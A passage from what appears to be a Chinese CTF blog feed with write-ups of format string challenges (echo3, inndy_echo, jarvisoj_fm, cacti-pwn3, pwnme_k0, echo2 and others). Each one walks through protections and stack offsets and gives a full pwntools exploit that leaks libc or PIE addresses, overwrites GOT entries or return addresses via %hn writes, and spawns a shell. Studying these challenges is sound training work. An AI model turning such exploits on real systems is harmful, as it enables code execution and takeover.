alt><br>会发现这个情况是没有<strong>构成ebp链</strong>的，这个时候就需要咱们自己来仔细观察栈上的数据，然后来挑选合适的栈数据来进行利用。</p><p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间来进行分析，这样做起来会简单一些。</p><p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt><br>仔细看下此时的栈情况 ，然后再次仔细分析下我们的目标 ：</p><ul><li>泄漏libc基址，计算出system的内存地址。</li><li>在栈上构造出printf的got地址和printf的got+2的地址（0x0804a014和0x0804a016）</li><li>在构造的got地址上，开始写system地址<br>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。</li></ul><p>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p><p>此时注意图上前两个红框，可以发现把前二个红框<strong>虽不是ebp</strong>的链，但是这也是<strong>成一个链</strong>可以利用了。然后可以把第二个红框的两个地址修改为 第一个红框的两个栈指针：</p><p>这里可以用gdb直接来手动设置，让咱们上来就写exp调试还是挺费劲的：</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt></p><p>这个过程中在泄漏目标栈地址以后，是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p><p>接着就可以构造got地址和got+2地址：</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>然后就可以利用对got地址和got+2地址使用<code>%xhn</code>,写system的内存地址上printf的got了：</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>写好以后，再传过去一下<code>/bin/sh</code>即可。</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continuedef fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>这个exp的难点在于：</p><ul><li>注意去定位到合适的栈结构再去利用</li><li>尽量充分利用每一次的printf</li><li>单次printf多次写入</li><li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。</li></ul><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>通过这两个例题说明，面对fmt的buf不在栈上时，归根结底也就是一定要学会<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。</p><p>但是也是做题时，也是一定要优先考虑ebp链是否能利用，因为ebp链构成的话，它的相对偏移就是<strong>针对性程序本身的</strong>，基本不会受到libc版本的影响，用起来很好用，要优先考虑。</p><p>还有就是面对这种会<strong>有随机栈情况、没有ebp链</strong>的题目，一定要注意本地和远程的libc版本、注意环境,因为这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;格式化字符串漏洞小总结（下）&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞小总结（下）&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞小总结（下）&quot;&gt;&lt;/a&gt;格式化字符串漏洞小总结（下）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞题目练习</title>
    <link href="http://chumen77.xyz/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <id>http://chumen77.xyz/2020/03/15/格式化字符串漏洞题目练习/</id>
    <published>2020-03-15T06:38:15.000Z</published>
    <updated>2020-06-26T03:43:20.333Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞题目练习"><a href="#格式化字符串漏洞题目练习" class="headerlink" title="格式化字符串漏洞题目练习"></a>格式化字符串漏洞题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整合一下最近做的格式化字符串题目的练习，把wp给写一下，方便对总结对这个漏洞的利用套路和技巧。</p><h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo/echo&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>可以看到会无限的打印你输入的东西，并且有system这个函数，利用思路也就是GOT hijack，把printf函数的got改为system的plt，注意要单次printf多次写入，改为system的plt后，再传过去<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></p><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code class="c">gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>确定偏移是7，打算一会写payload时候需要补齐，就<code>.ljust</code>补成0x20的，也就是<code>offset = 7 + 0x20/4 = 15</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>换一种就是用pwntools模块，面对32位，这种情况还是很好用的：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><pre><code class="c">[DEBUG] Sent 0x3c bytes:    00000000  10 a0 04 08  11 a0 04 08  12 a0 04 08  13 a0 04 08  │····│····│····│····│    00000010  25 32 34 30  63 25 37 24  68 68 6e 25  31 33 32 63  │%240│c%7$│hhn%│132c│    00000020  25 38 24 68  68 6e 25 31  32 38 63 25  39 24 68 68  │%8$h│hn%1│28c%│9$hh│    00000030  6e 25 34 63  25 31 30 24  68 68 6e 0a               │n%4c│%10$│hhn·││    0000003c</code></pre><p>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。</p><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [esp+2Ch] [ebp-5Ch]  unsigned int v5; // [esp+7Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  be_nice_to_people();  memset(&amp;buf, 0, 0x50u);  read(0, &amp;buf, 0x50u);  printf(&amp;buf);  printf(&quot;%d!\n&quot;, *(_DWORD *)&amp;x);  if ( *(_DWORD *)&amp;x != 4 )    return 0;  puts(&quot;running sh...&quot;);  system(&quot;/bin/sh&quot;);  return 0;}</code></pre><p>十分简单的题目，检验 x 值是否为4，如果是4（数字），就直接给你shell了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;# io = process(&#39;./fm&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26915)# io.recv()payload = p32(0x0804A02C) + &#39;%11$hn&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="winesap-week6"><a href="#winesap-week6" class="headerlink" title="winesap_week6"></a>winesap_week6</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre><code class="c">#include &lt;stdio.h&gt;int main() {    setvbuf(stdout, 0, _IONBF, 0);    alarm(180);    char str[100];    while(gets(str)) {        printf(str);    }    return 0;}</code></pre><p>需要编译为64位，这个题比起来第一个也就是没有了system函数，需要自己泄漏一下libc的base，算出system地址，然后还是GOT hijack就可以了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *import timecontext.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./fmt1&#39;)elf = ELF(&#39;./fmt1&#39;)libc = elf.libcprintf_got = 0x0000601020io.sendline(&#39;%21$p&#39;)io.recvuntil(&#39;0x&#39;)libc_base = int((io.recv(12)),16) - 240 -libc.symbols[&#39;__libc_start_main&#39;]system_addr = libc_base + libc.symbols[&#39;system&#39;]print(&#39;leak_libc_base: &#39; + hex(libc_base))print(&#39;system_addr: &#39; + hex(system_addr))def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_addrfor i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,12+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x30,&#39;a&#39;) + p64(printf_got) +p64(printf_got+2) + p64(printf_got+4)io.sendline(payload)sleep(1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h2 id="HITCON-Training-lab8"><a href="#HITCON-Training-lab8" class="headerlink" title="HITCON-Training-lab8"></a>HITCON-Training-lab8</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code class="c">#include &lt;stdio.h&gt;int magic = 0 ;int main(){    char buf[0x100];    setvbuf(stdout,0,2,0);    puts(&quot;Please crax me !&quot;);    printf(&quot;Give me magic :&quot;);    read(0,buf,0x100);    printf(buf);    if(magic == 0xda){        system(&quot;cat /home/craxme/flag&quot;);    }else if(magic == 0xfaceb00c){        system(&quot;cat /home/craxme/craxflag&quot;);    }else{        puts(&quot;You need be a phd&quot;);    }}</code></pre><p>编译为64位。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>（这个题目是纯粹就是为了练习任意地址写入的，我这里就直接写exp拿sheel了。）可以看到当再一次printf，之后程序便停止了，且结束前有puts函数。<br>思路就是可以GOT hijack put函数的GOT为read函数哪里，让其call puts函数时返回到read函数，并且在这次printf函数漏洞利用时，也把printf函数的GOT改为system的plt，然后传入<code>/bin/sh</code>即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./craxme&#39;)# io = remote(&#39;127.0.0.1&#39;,8888)magic = 0x0000060106Cio.recvuntil(&#39;:&#39;)system_plt = 0x04005A0puts_got = 0x0601018ret_addr = 0x00400747printf_got = 0x00601030key = 0x00400747key2 = 0x04005A0def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key &gt;&gt; i*16) &amp; 0xfffffor i in range(3):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,29+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x80+0x20,&#39;a&#39;) + flat([puts_got,puts_got+2,puts_got+4,printf_got,printf_got+2,printf_got+4])io.sendline(payload)io.interactive()</code></pre><h2 id="cacti-pwn3"><a href="#cacti-pwn3" class="headerlink" title="cacti-pwn3"></a>cacti-pwn3</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题模拟了一个ftp服务。<br><img src="http://qiqianyun.chumen77.xyz/uPic/DH8PyF.png" srcset="/img/loading.gif" alt><br>这里控制的是登陆。进入分析一下：</p><pre><code class="c">char *__cdecl ask_username(char *dest){  char src[40]; // [esp+14h] [ebp-34h]  int i; // [esp+3Ch] [ebp-Ch]  puts(&quot;Connected to ftp.hacker.server&quot;);  puts(&quot;220 Serv-U FTP Server v6.4 for WinSock ready...&quot;);  printf(&quot;Name (ftp.hacker.server:Rainism):&quot;);  __isoc99_scanf(&quot;%40s&quot;, src);  for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i )    ++src[i];  return strcpy(dest, src);}</code></pre><p>用户名函数，发现对你输入的东西进行诸位的进行加一。</p><pre><code class="c">int __cdecl ask_password(char *s1){  if ( !strcmp(s1, &quot;sysbdmin&quot;) )    return puts(&quot;welcome!&quot;);  puts(&quot;who you are?&quot;);  exit(1);  return puts(&quot;welcome!&quot;);}</code></pre><p>用户密码函数，发现要跟<code>sysbdmin</code> 进行对比，如果不相等，就直接退出。<br>(strcmp函数对比两个字符串时，相等返回0，!0 = 非假 = 真）<br>所以这个绕过就时sysbdmin 诸位减1即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/tBKwyW.png" srcset="/img/loading.gif" alt><br>剩下的就是输入<code>get put dir</code>,会进入不同的分支，其中输入get函数：</p><pre><code class="c">int get_file(){  char dest; // [esp+1Ch] [ebp-FCh]  char s1; // [esp+E4h] [ebp-34h]  char *i; // [esp+10Ch] [ebp-Ch]  printf(&quot;enter the file name you want to get:&quot;);  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )    puts(&quot;too young, too simple&quot;);  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )  {    if ( !strcmp(i, &amp;s1) )    {      strcpy(&amp;dest, i + 40);      return printf(&amp;dest);    }  }  return printf(&amp;dest);}</code></pre><p>这个函数是有格式化字符串漏洞的，当你put上去一个文件，它会让你输入文件名字和文件内容，然后get这个函数会根据文件名字，来输出其内容，利用这两个函数搭配一下就可以实现格式化字符串漏洞的利用了。并且在dir中，其会输出一个文件的名字，用的是puts函数。然后就有思路利用了：</p><ul><li>由于没有system函数，然后就需要想办法泄漏一下libc地址，来算出system的函数在libc的地址。</li><li>修改puts函数的got为system的地址，然后记得这个文件的名称是<code>/bin/sh</code>,这样在使用dir调用puts函数时，就可以拿到shell了。<br>这题比较有趣，有点难在分析这个程序在干嘛，利用思路倒是不难。</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./pwn3&#39;)elf = ELF(&#39;./pwn3&#39;)libc = elf.libcs = &#39;sysbdmin&#39;key = &#39;&#39;for i in s:    key+=chr(ord(i)-1)print(key)io.sendline(key)info(&#39;---------leak libc_base--------&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;1111&#39;)puts_got = elf.got[&#39;puts&#39;]io.sendline(&#39;%8$s&#39; + p32(puts_got) )io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)io.sendline(&#39;1111&#39;)puts_addr = u32(io.recv(4)[:4])print(&#39;puts_add:&#39; + hex(puts_addr))sys_addr = puts_addr - libc.symbols[&#39;puts&#39;] + libc.symbols[&#39;system&#39;]io.recvuntil(&#39;&gt;&#39;)info(&#39;---------hijack puts_got--------&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;/bin/sh;&#39;)payload = fmtstr_payload(7,{puts_got: sys_addr})io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)info(&#39;--------- get shell-------&#39;)io.sendline(&#39;/bin/sh;&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;dir&#39;)io.interactive()</code></pre><h2 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme_k0"></a>三个白帽 - pwnme_k0</h2><h3 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>开启了RELRO，这样就无法修改got了。</p><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出。其中在展示用户信息当中，存在格式化字符串漏洞：</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>其中发现其输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt><br>并且还发现其中有个后门函数，会调用system函数给你shell，就可以去修改程序的返回地址，直接返回到这里就拿到shell了。<br>Gdb调试定位关键在这个printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt></p><p>看一下此时的栈情况，输入的usename可以确定偏移是8，rdi也是指向了存放password的地址。并且发现栈上也有很多栈的地址信息，当第二次运行到这里的时候，这里esp对应的地址信息也是不会变的，所以就可以通过泄漏这里的值来算出ret address，然后修改用户信息，这下把ret address的point放到栈上，接着就开始修改ret address的值了。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h2 id="inndy-echo2"><a href="#inndy-echo2" class="headerlink" title="inndy-echo2"></a>inndy-echo2</h2><h3 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo2/echo2&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>可以看到开启了pie，这时候就需要来泄漏一下pie的基地址。</p><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">void __noreturn echo(){  char s; // [rsp+0h] [rbp-110h]  unsigned __int64 v1; // [rsp+108h] [rbp-8h]  v1 = __readfsqword(0x28u);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s, 256LL);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>代码是比较简单的，还是got hijack 就行了。难点也是如何来处理这个pie保护。</p><h3 id="gdb-调试"><a href="#gdb-调试" class="headerlink" title="gdb 调试"></a>gdb 调试</h3><pre><code class="c">=&gt; 0x555555554984 &lt;echo+68&gt;:    call   0x5555555547a0 &lt;printf@plt&gt;   0x555555554989 &lt;echo+73&gt;:    lea    rax,[rbp-0x110]   0x555555554990 &lt;echo+80&gt;:    lea    rsi,[rip+0xfd]        # 0x555555554a94   0x555555554997 &lt;echo+87&gt;:    mov    rdi,rax   0x55555555499a &lt;echo+90&gt;:    call   0x5555555547d0 &lt;strcmp@plt&gt;</code></pre><p>找到关键点，然后看一下栈情况：</p><pre><code class="c">0192| 0x7fffffffe1c0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087--More--(25/48)0200| 0x7fffffffe1c8 --&gt; 0x7ffff7a88947 (&lt;_IO_default_setbuf+23&gt;:    cmp    eax,0xffffffff)0208| 0x7fffffffe1d0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad20870216| 0x7fffffffe1d8 --&gt; 0x7ffff7fd8700 (0x00007ffff7fd8700)0224| 0x7fffffffe1e0 --&gt; 0x555555554810 (&lt;_start&gt;:    xor    ebp,ebp)0232| 0x7fffffffe1e8 --&gt; 0x7ffff7a85439 (&lt;_IO_new_file_setbuf+9&gt;:    test   rax,rax)0240| 0x7fffffffe1f0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087</code></pre><p>发现在<code>0x7fffffffe1e0</code>这里就可以泄漏出pie基址了，确定偏移是34。然后剩下的就简单了，直接ida里面查看下plt和got ，加上以后就得到了真正的<br>plt和got地址。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./echo2&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,28200)def leak1():    io.sendline(&#39;%34$p&#39;)    io.recvuntil(&#39;0x&#39;)    p_bass_addr = int((io.recv(9)+&#39;000&#39;),16)    return p_bass_addrp_bass_addr = leak1()print(&#39;p_bass_addr -&gt;&#39; + hex(p_bass_addr))print_got = 0x201020 + p_bass_addrprint(&#39;print_got -&gt;&#39; + hex(print_got))system_plt = 0x790 + p_bass_addrprint(&#39;system_plt -&gt;&#39; + hex(system_plt))def fmt(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_pltfor i in range(3):    payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x40,&#39;a&#39;) + flat([print_got,print_got+2,print_got+4])# 